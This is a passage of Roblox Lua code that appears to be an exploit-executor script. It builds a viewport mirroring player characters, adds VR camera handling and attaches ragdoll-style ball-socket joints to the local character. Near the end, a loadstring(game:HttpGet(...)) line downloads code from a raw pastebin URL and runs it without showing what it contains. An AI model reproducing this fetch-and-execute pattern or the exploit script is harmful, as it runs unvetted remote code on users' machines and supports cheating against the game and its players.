						if Part and Real and Part.Parent and Real.Parent then
							Part.CFrame = Real.CFrame
						elseif Part.Parent and not Real.Parent then
							Part:Destroy()
						end
					end
				end
			end)
			
			FakeChar.Parent = Viewcam
		end
		
		Player.CharacterAdded:Connect(CharacterAdded)
		
		if Player.Character then
			spawn(function()
				CharacterAdded(Player.Character)
			end)
		end
	end
	
	local PlayerAdded = Players.PlayerAdded:Connect(OnPlayerAdded)
	
	for _, Player in pairs(Players:GetPlayers()) do
		OnPlayerAdded(Player)
	end
	
	ViewPart.Size = Vector3.new()
	
	if VRReady then
		Viewport.Position = UDim2.new(.62, 0, .89, 0)
		Viewport.Size = UDim2.new(.3, 0, .3, 0)
		Viewport.AnchorPoint = Vector2.new(.5, 1)
	else
		Viewport.Size = UDim2.new(0.3, 0, 0.3, 0)
	end
	
	local RenderStepped = RunService.RenderStepped:Connect(function()
		local Render = Camera.CFrame
		local Scale = Camera.ViewportSize
		
		if VRReady then
			Render = Render * VRService:GetUserCFrame(Enum.UserCFrame.Head)
		end
		
		CameraPort = CFrame.new(Render.p + Vector3.new(5, 2, 0), Render.p)
		
		Viewport.Camera.CFrame = CameraPort
		
		ViewPart.CFrame = Render * CFrame.new(0, 0, -16)
		
		ViewHUD.Size = UDim2.new(0, Scale.X - 6, 0, Scale.Y - 6)
	end)
		
	--
	
	local CharacterAdded
	
	CharacterAdded = Client.CharacterAdded:Connect(function()
		RenderStepped:Disconnect()
		CharacterAdded:Disconnect()
		PlayerAdded:Disconnect()
		
		ViewHUD:Destroy()
		ViewHUD = nil
	end)
	
	wait(9e9)
end;

Script()

wait(2)

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local character = lp.Character
local A0LL = Instance.new("Attachment", character["Left Leg"])
A0LL.Position = Vector3.new(0, 1, 0)
local A1LL = Instance.new("Attachment", character["Torso"])
A1LL.Position = Vector3.new(-0.5, -1, 0)
local socket1 = Instance.new("BallSocketConstraint", character["Left Leg"])
socket1.Attachment0 = A0LL
socket1.Attachment1 = A1LL
local A0RL = Instance.new("Attachment", character["Right Leg"])
A0RL.Position = Vector3.new(0, 1, 0)
local A1RL = Instance.new("Attachment", character["Torso"])
A1RL.Position = Vector3.new(0.5, -1, 0)
local socket2 = Instance.new("BallSocketConstraint", character["Right Leg"])
socket2.Attachment0 = A0RL
socket2.Attachment1 = A1RL
local A0H = Instance.new("Attachment", character["Head"])
A0H.Position = Vector3.new(0, -0.5, 0)
local A1H = Instance.new("Attachment", character["Torso"])
A1H.Position = Vector3.new(0, 1, 0)
local socket5 = Instance.new("BallSocketConstraint", character["Head"])
socket5.Attachment0 = A0H
socket5.Attachment1 = A1H
loadstring(game:HttpGet("https://pastebin.com/raw/Byd1PdHn",true))()
-----------------------------------------------------------
wait(9e9)
@